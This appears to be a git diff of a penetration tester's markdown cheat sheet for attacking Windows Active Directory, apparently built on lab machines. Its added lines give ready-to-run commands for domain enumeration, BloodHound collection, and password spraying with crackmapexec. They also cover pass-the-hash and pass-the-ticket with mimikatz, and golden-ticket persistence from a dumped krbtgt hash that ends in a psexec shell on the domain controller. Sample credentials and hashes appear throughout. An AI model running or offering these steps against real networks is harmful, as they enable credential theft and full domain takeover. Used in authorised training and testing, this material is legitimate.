@@ -1,17 +1,19 @@
+[TOC]
+
+
+
 # Enumeration
 
-```bas
-net user
-net user /domain
-net user jeff_admin /domain
-net group /domain
-[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent Domain()
+### Ldap search
 
+```bash
+1# ldapsearch -h 10.10.10.182 -x -s base namingcontexts
+2# ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local"
+3# ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=person)' #only poeple
 
-Nmap –p 88 –script-args krb5-enum-users.realm='sv-dc01.svcorp.com',userdb=./Secli 10.11.1.20
+1# enum4linux 10.10.10.182
+
 ```
-
-
 
 ### AD Dump
 
@@ -19,17 +21,57 @@ Nmap –p 88 –script-args krb5-enum-users.realm='sv-dc01.svcorp.com',userdb=./
 ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/
 ```
 
+### Internal Basic
 
+```powershell
+PS C:\> net user
+PS C:\> net user /domain
+PS C:\> net user jeff_admin /domain
+PS C:\> net group /domain
+PS C:\> net localgroup "Audit Share"
+PS C:\> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent::Domain()
 
-```bash
-#Mimikatz
-sekurlsa::logonpasswords  #show current cashed Password
-mimikatz # sekurlsa::logonpasswords
+PS C:\> get-scheduledtask
+PS C:\> (get-scheduledtask -taskname "Revert Password and Expiry").actions | fl execute, arguments
 
+Get Domain Controlers
+#Get-ADDomainController
+#Get-ADDomainController -Identity <DomainName>
 
+Enumerate Domain Users
+#Get-ADUser -Filter * -Identity <user> -Properties *
+#Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
+
+Enum Domain Computers
+#Get-ADComputer -Filter * -Properties *
+#Get-ADGroup -Filter * 
+
+Enum Local AppLocker Effective Policy
+#Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 
+### BloodHound
 
+```bash
+# run the collector on the machine using SharpHound.exe
+# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
+.\SharpHound.exe (from resources/Ingestor)
+.\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
+.\SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100
+.\SharpHound.exe -c all -d active.htb -SearchForest
+.\SharpHound.exe --EncryptZip --ZipFilename export.zip
+.\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>
+
+# or run the collector on the machine using Powershell
+# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
+Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
+Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
+
+# or remotely via BloodHound Python
+# https://github.com/fox-it/BloodHound.py
+pip install bloodhound
+bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
+```
 
 # Authentication
 
@@ -47,6 +89,18 @@ mimikatz # sekurlsa::logonpasswords
 >
 > TICKET BASED.
 
+
+
+# Spray Attacks
+
+```bash
+$ crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2
+$ crackmapexec smb fuse.fabricorp.local -u users.txt -p "Fabricorp01"
+$ spray.sh -smb IP <users.txt> <passwords.txt> 0 0 <DOMAIN>
+```
+
+
+
 # Cashed Passwords
 
 ```bash
@@ -59,9 +113,7 @@ kerberos::list /export
 OR
 klist
 
-
 sekurlsa::pth /user:ws01$ /domain:offense.local /ntlm:ab53503b0f35c9883ff89b75527d5861
-
 ```
 
 # Service Account Attacks
@@ -162,10 +214,73 @@ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f0
 $ privilege::debug
 $ sekurlsa::pth /user:alice /domain:sv-dc01.svcorp.com /ntlm:7f004ce6b8f7b2a3b6c477806799b9c0 /run:PowerShell.exe
 
+#Now convert NTLM hash to Kerbros TGT
+$ net use \\dc01
+
+#Open cmd.exe using psexec
+$ .\PSExec.exe \\dc01 cmd.exe
 
 ```
 
 
 
 **Pass the Ticket**
+
+```powershell
+whoami /user
+
+$ kerberos::purge
+$ kerberos::list
+$ kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-278
+7523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748
+290D87AA966C327 /ptt
+
+kerberos::list
+```
+
+
+
+
+
+# Persistence 
+
+
+
+### Golden Ticket
+
+**ON Domain Contorller** -- get the krbtgt NTLM hash -- Because DC traust any ticket correctly created by the krbtgt hash even if victim is not domain joined.
+
+```powershell
+mimikatz # privilege::debug
+mimikatz # lsadump::lsa /patch
+RID : 000001f6 (502)
+User : krbtgt
+LM :
+NTLM : 75b60230a2394a812000dbfad8415965
+```
+
+ON Victim -- Using mimikatz create Golden Ticket with krbtgt hash
+
+```powershell
+mimikatz # kerberos::purge
+mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2
+787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+
+mimikatz # misc::cmd
+
+#get shell on DC using the injected Ticket
+C:\Users\offsec.crop> psexec.exe \\dc01 cmd.exe
+C:\Windows\system32> whoami
+corp\fakeuser
+```
+
+
+
+# PowerView
+
+```powershell
+C:/> . .\PowerView.ps1
+C:/> Get-NetDomain
+C:/> 
+```
 
